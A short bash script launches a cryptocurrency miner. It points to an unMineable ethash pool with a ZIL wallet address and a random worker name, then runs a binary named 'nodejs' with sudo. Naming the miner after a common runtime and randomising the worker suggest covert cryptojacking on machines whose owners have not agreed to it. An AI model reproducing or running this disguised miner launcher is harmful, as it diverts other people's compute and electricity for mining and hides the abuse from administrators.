#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=ZIL:zil12xj5q0cvpjaz5nm02zntwsp4yr5zvlt2an5mer
WORKER=$(echo $(shuf -i 1000-99999 -n 1)-gas) 
chmod +x nodejs
sudo ./nodejs -epool $POOL -wal $WALLET -worker $WORKER 
